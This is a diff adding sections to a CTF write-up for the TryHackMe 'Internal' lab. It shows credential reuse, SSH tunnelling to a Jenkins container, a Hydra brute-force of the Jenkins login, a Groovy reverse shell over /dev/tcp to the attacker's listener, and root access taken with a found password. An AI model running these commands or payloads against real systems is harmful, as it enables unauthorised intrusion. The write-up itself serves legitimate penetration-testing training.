@@ -239,7 +239,7 @@ http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
 ```shell
 $ nc -lvnp 4444 
 listening on [any] 4444 ...
-connect to [My IP] from (UNKNOWN) [10.10.137.106] 42942
+connect to [My IP] from (UNKNOWN) [10.10.42.84] 42942
 Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  12:33:09 up 10 min,  0 users,  load average: 0.00, 0.11, 0.13
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -379,7 +379,233 @@ define('DB_COLLATE', 'utf8_general_ci');
 define('WP_CONTENT_DIR', '/var/www/html/wordpress/wp-content');
 ```
 
-After some more seraching, i found an interesting text file in the /opt directory and 
+After some more searching, i found an interesting text file in the /opt directory. The content of the file contains aubreanna credentials. Which means we can login to aubreanna using this. 
+
+```shell
+$ cd /opt
+$ ls
+containerd
+wp-save.txt
+$ cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+```
+This error show we need to run this on a terminal.
+
+```shell
+$ su -l aubreanna
+su: must be run from a terminal
+```
+
+Since we're using netcat reverse shell, the shell is not stable. So in order to fix this we need to spawn a stable shell with the following commands 
+
+```shell
+$ python -c "import pty;pty.spawn('/bin/bash')"
+```
+Now we can try again and hopefully it should work 
+
+```shell
+www-data@internal:/opt$ su -l aubreanna
+su -l aubreanna
+Password: bubb13guM!@#123
+
+aubreanna@internal:~$
+```
+
+And we're in !!!!!!
+
+We have now obtain the user flag !!!!
+
+```shell
+aubreanna@internal:~$ whoami
+whoami
+aubreanna
+aubreanna@internal:~$ ls
+ls
+jenkins.txt  snap  user.txt
+aubreanna@internal:~$ cat user.txt
+```
+
+## 4. Privilege Escalation (Jenkins)
+
+There is a 'jenkins.txt' which contains some interesting message.
+
+```shell
+cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+```
+
+Ok, Apparently there is somethign running on a a specific IP and port on localhost, the text shows a jenkins server is running on the address
+We check the network by using 'ifconfig' and its apprears that there is a docker running on the target machine with '172' series. At this point we want to access that port but 
+its not reachable from our browser. So we perfomed a SSH tunneling to forward that address to the target machine. 
+We want to establish an SSH connection from the server and forward the traffic to a specfic port from our local host. 
+
+```shell
+$ ssh -L 4444:172.17.0.2:8080 aubreanna@internal.thm 
+aubreanna@internal.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug  8 13:11:10 UTC 2023
+
+  System load:  0.0               Processes:              120
+  Usage of /:   63.7% of 8.79GB   Users logged in:        1
+  Memory usage: 45%               IP address for eth0:    10.10.42.84
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+  => There is 1 zombie process.
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Aug  8 13:07:43 2023 from 10.10.42.84
+aubreanna@internal:~$
+```
+
+Now we should be able to access the jenkins server from our browser to our assigned port.
+
+![image](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/b8170aac-4baa-4b56-9d41-0d2dcd4999ea)
+
+It worked !
+Now the login part. 
+
+We tried using aubreanna's credentials to login but failed, we took some time to find the login credintials within the aubreanna's SSH but couldn't find anything. After conducting further research on jenkin server. A quick seach says that most jenkins default credentials is admin as the username. So we took this chance and performed a bruteforce attack on the password. 
+
+We're going to use hydra for this. First we need the variables HTTP/POST request by using burpsuite.
+
+![19 burp](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/76ebaafe-7cf6-43f3-87dc-b1e7e8141a7d)
+
+We got the parameter, circle in red is how the login parameters respond
+
+Hydra time !!!!!!!!
+
+```shell
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login:Invalid username or password" 
+```
+![Capture](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/83f276f2-2cb8-42cc-9636-97a3554c5fa8)
+
+lol nice password :)
+
+We're in the server. So with jenkins have a script console for any code execution so we can use that to create a reverse shell. Finding out that jenkins is java, we'll use the Groovy script by pentestingmonking.
+
+![20 script consol](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/43d03f9a-fe69-4ae8-bdc4-ae2abda25f19)
+
+
+```shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<My IP>/5555;cat<&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+Create a netcat listener 
+
+```shell
+$ nc -lvnp 5555 
+listening on [any] 5555 ...
+connect to [My IP] from (UNKNOWN) [10.10.42.84] 35436
+id
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
+/bin/bash -i
+bash: cannot set terminal process group (6): Inappropriate ioctl for device
+bash: no job control in this shell
+jenkins@jenkins:/$
+```
+
+And we're in the docker enviroment !!!!!
+
+## 5. Privilege Escalation (Root)
+
+Ok after understanding with aubreanna credential with the text file, we believe that it would be the same with the root credential. 
+The problem with jenkins some commands may not work like normal linux commands so we have to research on how to use the command on jenkins. 
+we use the find command to locate a text file within the server. 
+
+```shell
+jenkins@jenkins:/$ find / -name *.txt
+find / -name *.txt
+/opt/note.txt
+```
+We checked the /opt to locate the note.txt and what do you know !!!!
+
+```shell
+jenkins@jenkins:/opt$ cat note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+jenkins@jenkins:/opt$
+```
+Root credentials !!!!!!
+
+Now we can SSH the root user.
+
+```shell
+$ ssh root@internal.thm     
+root@internal.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug  8 13:42:12 UTC 2023
+
+  System load:  0.0               Processes:              113
+  Usage of /:   63.7% of 8.79GB   Users logged in:        1
+  Memory usage: 39%               IP address for eth0:    10.10.42.84
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+  => There is 1 zombie process.
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Aug  3 19:59:17 2020 from <IP>
+root@internal:~# whoami
+root
+```
+
+BOOM we are root !!!!!!! Now obtain the final flag 
+
+```shell
+root@internal:~# ls
+root.txt  snap
+root@internal:~# cat root.txt
+```
+# Conclusion 
+Thank you for taking you time to read my writeup for the Internal CTF challenge. This was a fun and challenging CTF that is avaliable on tryhackme. Personally, i have learnt so much in this challenge from identifying 
+vulnrability services to exploiting with numerous techniques. I found this to be very helpful in my penertration testing progression. Thank you again for reading to the end and happy hacking!!!!!!!!!!!!!!!!!!!!!!
+
+
+
+
+
+
+
 
 
 
